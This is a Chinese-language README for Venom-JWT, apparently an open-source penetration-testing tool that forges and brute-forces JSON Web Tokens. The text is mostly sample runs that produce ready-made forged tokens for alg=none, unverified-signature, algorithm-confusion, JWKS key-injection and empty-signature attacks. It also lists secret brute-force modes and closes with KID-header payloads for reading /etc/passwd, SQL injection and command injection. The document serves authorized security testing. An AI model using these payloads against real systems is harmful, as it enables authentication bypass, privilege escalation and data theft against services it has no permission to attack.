# Venom-JWT渗透工具 - 针对JWT漏洞和密钥爆破服务渗透测试
**郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，<u>任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担</u>** 。
<p align="center"><a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-_red.svg"></a><a href="https://github.com/z-bool/Venom-JWT"><img  src="https://goreportcard.com/badge/github.com/projectdiscovery/httpx"></a></p>
针对JWT渗透开发的漏洞验证/密钥爆破工具，针对CVE-2015-9235/未验证签名攻击/CVE-2016-10555/CVE-2018-0114/CVE-2020-28042的结果生成用于FUZZ，也可使用字典/字符枚举的方式进行爆破
<p align="center"><a href="#install">工具介绍</a> · <a href="#tall">使用说明</a> · <a href="#notice">注意事项</a> · <a href="#communicate">技术交流</a></p>
<div id="install"></div>
<h3>工具介绍</h3>
该工具的诞生背景：

在平时公司项目渗透测试时，在做前后端分离项目的时经常会遇到JWT作为Token来进行权限校验，平时可以用jwt-tool等工具，但是仍不能一步到位，所以我这里使用go来开发一款一步到位的JWT渗透辅助工具，帮助大家进行越权测试。

该工具的应用场景是什么：

- 以JWT作为鉴权方式
- 通过生成的修改Payload的JWT结果粘贴进Repeater结果中进行验证，判断是否存在无需Secret即可利用的nday
- 在无nday的情况下，针对JWT的Secret进行爆破

该工具的优势是什么：
- 交互引导式参数运行/命令行参数指定运行=》两种运行方式
- 考虑大多针对JWT的漏洞存在的问题
- 可以根据ISSUE进行持续维护（你知道的呀，你们测试发现问题，只需要做做优化，卡卡巴适）

<div id= "tall"></div>

<h3>使用说明</h3>

```
# 打包
go mod tidy 
cd cmd
go build.

# 命令行运行
.\cmd.exe -h
Usage of C:\Users\xxx\Venom-JWT\cmd\cmd.exe:
  -df string
        是否使用文件中的payload，默认为空使用角色内置字典（绑定模式2），模式3非空(绑定模式3)
  -em int
        secret加密模式NONE/MD5/16位MD5/BASE64(默认ALL=>0,NONE=>1,MD5=>2,16位MD5=>3,BASE64)
  -fs string
        爆破的默认字典，可以自行按猜测的规则修改(配合-fz 位数使用) (default "abcdefghijklmnopqrstuvwxyz0123456789")
  -fz int
        字符爆破最大字符数（如果字符爆破要指定位数-fz）
  -jbc string
        需要修改的JWT body
  -jm int
        模式1：(未知Secret)修改Payload越权测试 模式2: (先测试模式1)PayloadFuzz越权测试 模式3：secret文本爆破 模式4：secret字符爆破（如果字符爆破要指定位数-fz）模式5：对JWT的Secret进行验证 (default 1)
  -jwt.txt string
        JWT字符串
  -mz int
        字符爆破最小字符数（如果字符爆破要指定位数-mz）,默认为1 (default 1)
  -pem string
        公钥pem的路径(最好绝对路径)
  -pt int
        选择模式：0为默认全执行，1为修改alg为none(CVE-2015-2951)，2为未验证签名导致的越权，3修改非对称密码算法为对称密码算法(CVE-2016-10555) 4为JWKS公钥注入--伪造密钥(CVE-2018-0114) 5 为空签名(CVE-2020-28042)
  -s string
        已知Secret，默认为空
        
# 交互式运行
.\cmd.exe
? 【前置选择】未知secret的情况下修改JWT测试越权，请选择模式:
[·]  [Use arrows to move, type to filter]
> 模式1：(未知Secret)修改Payload越权测试
  模式2：(先测试模式1)PayloadFuzz越权测试
  模式3：secret文本爆破
  模式4：secret字符爆破
  模式5：对JWT的Secret进行验证

? 请输入你的JWT字符串:
[·] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.Vjqa5vYv9uRUqiaQpsDxlswGfK5n2umAp-NrY0p39bg
[+]JWT Header: {"alg":"HS256","typ":"JWT"}
JWT Payload: {"iss":"admin","iat":1701375177,"exp":1701382377,"nbf":1701375177,"sub":"user","jti":"a01707f44f7df8b5cbe5e129a0f5c311"}
JWT Signature: 563a9ae6f62ff6e454aa2690a6c0f196cc067cae67dae980a7e36b634a77f5b8

? 【模式1】【模式2】未知secret的情况下修改JWT测试越权，请选择具体测试模式:
[·]  [Use arrows to move, type to filter]
> 模式0：默认全执行
  模式1：修改alg为none(CVE-2015-2951)
  模式2：未验证签名导致的越权
  模式3：修改非对称密码算法为对称密码算法(CVE-2016-10555)
  模式4：JWKS公钥注入--伪造密钥(CVE-2018-0114)
  模式5：空签名(CVE-2020-28042)

? 您在选择【模式1】【模式2】【模式5】中需要修改JWT的第二部分Payload中JSON字符串进行修改测试越权，请从上一步中复制Payload部分修改完后在此输入:
【模式1】【模式5】示例:{"username":"admin","role":"admin"}
【模式2】示例:{"usernmae":"admin","role":"FUZZ"}
请注意【模式2】中的FUZZ此处为字典替换位置，如果不修改可以直接为enter回车默认使用原Payload

? 请输入您搜集的公钥pem的文件路径(最好为绝对路径)
[·] C:\Users\15403\Desktop\Venom-JWT\public_key.pem

==============没secret修改Payload的越权测试===========

① 大部分情况在alg为HS256时候，可以将JWT改为none的情况(CVE-2015-9235)

[+]【alg为none】: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.
[+]【alg为None】: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.
[+]【alg为NoNe】: eyJhbGciOiJOb05lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.
[+]【alg为NONE】: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.
② 未验证签名攻击：修改Payload不校验

[+]【无效签名攻击】: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.Vjqa5vYv9uRUqiaQpsDxlswGfK5n2umAp-NrY0p39bg
③ 修改非对称密码算法为对称密码算法(CVE-2016-10555)攻击

[+] 【修改非对称密码算法为对称密码算法】:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiIiLCJraWQiOiIiLCJ1c2UiOiIiLCJuIjoiIiwiZSI6IiJ9fQ.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.h3V6ZHHJ3tt080xFLsA4U1_Z0VT8wkLQD9I2miqIeE0
④ JWKS公钥注入--伪造密钥(CVE-2018-0114)攻击

[+]【伪造密钥】: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJleGFtcGxlQGV4YW1wbGUuY29tIiwidXNlIjoic2lnIiwibiI6IjdLVktGZXpyeTlIclRFUERUcG5Xc2V3cnZQUkNsVE1pZXNGb1BXVlFtOTRMbFpwZzhmT1puMU4zMWNMMWdMUDROTExqek42cmFfRG8tQnJyZEVNMkpSeVVpUjUxUEpKTFUyRG9TdUNZcHlhTk53TG0zNzZEY09td1VyWlJ1SVVyMmlpWWJsVVJwaXl4SVl1SzJuWVIzYzBvalZGdnNJMmluc25PZnhIaTJvWkNWdS1SeDdVQkJIdDFRUUxzUEc4MDh4cVJDTU4yd1EwYklDNVZKWkl3YzhaQnVCNnVEUXRnSFc2UjBKc0hyU1BOVk9wY2NXbHJURlpGQjV0SVhxMUhJLUh1QnZ4WW53LWRYdU1FYWZSczFkQzg5Q3FfQ1FHSnY0M2h4SzZsQlZ4bnNQYWQ2QmpGSGZrSVQxdnk4LTNfSUJMT2J0Vnp0eDQyTmFGTzhzcVZrUSIsImUiOiJBUUFCIn19.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.6yhddpQy3gxajRYCc3HQHGflqLfyN3Ettre95E_u_BYtEl7-6058CKEdQjWT8CIPD7UGz6Mktx43o8Q2R5ILzkro2TkrE7ELW0--CDCf1bot--ho8LCovybl5TZtTGbSfE5F1zPiQCPnJTnQOe438VU7-MykBVFW690B1Ymk6YbmTzVyVS3mgdE252ocGHIyoG8EEPW3u3ZYXcB9rL30-mNLKmkctPHRCE-TXv7CZtLsrwK7SJTPgBh1jKtsdfFEXtpGrHOwaG2OOk5k8CzpIbWN9rt6lp4hlVaX-5Y1WWpPRHsmBCLVytZaJ2iQtLJjaZM659_hK_w5Os6sngyVNA
⑤ 空签名(CVE-2020-28042)攻击

[+]【空签名】: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMTM3NTE3NywiZXhwIjoxNzAxMzgyMzc3LCJuYmYiOjE3MDEzNzUxNzcsInN1YiI6InVzZXIiLCJqdGkiOiJhMDE3MDdmNDRmN2RmOGI1Y2JlNWUxMjlhMGY1YzMxMSJ9.
注意：所有JWT结果都已经保存在运行目录下的result.txt中，可以去重放Intruder测试是否为可行Token

```
**① 大部分情况在alg为HS256时候，JWT改为none的情况(CVE-2015-9235)**

**② 未验证签名攻击：修改Payload不校验**

**③ 修改非对称密码算法为对称密码算法(CVE-2016-10555)攻击**

**④ JWKS公钥注入--伪造密钥(CVE-2018-0114)攻击**

**⑤ 空签名(CVE-2020-28042)攻击**

![result.txt](img/result.png)
可以直接进行Repeater重放。

**其余特殊漏洞发现：**

在JWT的第一段解析时，如果发现出现其他参数，可能会产生其他漏洞会产生提示。
```
// Java的测试代码
public class JwtExample {
    private static void disableKeyLengthCheck() throws Exception {
        // 使用反射修改 SignatureAlgorithm.HS256 的 minKeyLength
        Field minKeyLengthField = SignatureAlgorithm.class.getDeclaredField("minKeyLength");
        minKeyLengthField.setAccessible(true);
        minKeyLengthField.set(SignatureAlgorithm.HS256, 0); // 将最小密钥长度设置为 0
    }
    public static void main(String[] args) throws Exception {
        disableKeyLengthCheck();
        // 原始密钥
        String secret = "test@123";


        JwtBuilder jwtBuilder = Jwts.builder().setHeaderParam("kid", "your-key-id").setId("400").setSubject("test").setAudience("{\"abc\":\"123\"}").signWith(SignatureAlgorithm.HS256, secret.getBytes());
        HashMap<String, Object> stringObjectHashMap = new HashMap<>();
        stringObjectHashMap.put("test", "test");
        jwtBuilder.addClaims(stringObjectHashMap);
        System.out.println(jwtBuilder.compact());
    }
}
```
生成结果：
eyJraWQiOiJ5b3VyLWtleS1pZCIsImFsZyI6IkhTMjU2In0.eyJqdGkiOiI0MDAiLCJzdWIiOiJ0ZXN0IiwiYXVkIjoie1wiYWJjXCI6XCIxMjNcIn0iLCJ0ZXN0IjoidGVzdCJ9.QhH2ACZXaoa3F5LIDAQVnhoCgsXWEIw44H7m6pO9bxM

![jwtio](img/jwtio.png)

![kid](img/kid.png)

![提示](img/tishi.png)

这里相关的漏洞(我从别的文章扒下来的，大家自己分析)

### 改 KID 参数
**1. 任意文件读取**

KID参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。
```
{  "typ": "JWT",  "kid": "/etc/passwd",  "alg": "HS256"}
```
**2、SQL注入**

KID也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证

存在KID字段尝试注入，将KID值修改为SQL语句，username改为Tom，签名密钥与SQL语句相同，例如SQL语句中为3的base64编码Mw==，所以此时签名密钥写3：

```
{ "typ": "JWT", "kid":"';select 'Mw==' from jwt_keys --"}
```

**3. 命令注入**

对KID参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open 函数，通过构造参数就可能造成命令注入。

```
{  "typ": "JWT",  "kid": "/path/to/key_file|whoami",  "alg": "HS256"}
```
如果出现其他参数时候，也可以进行进一步分析。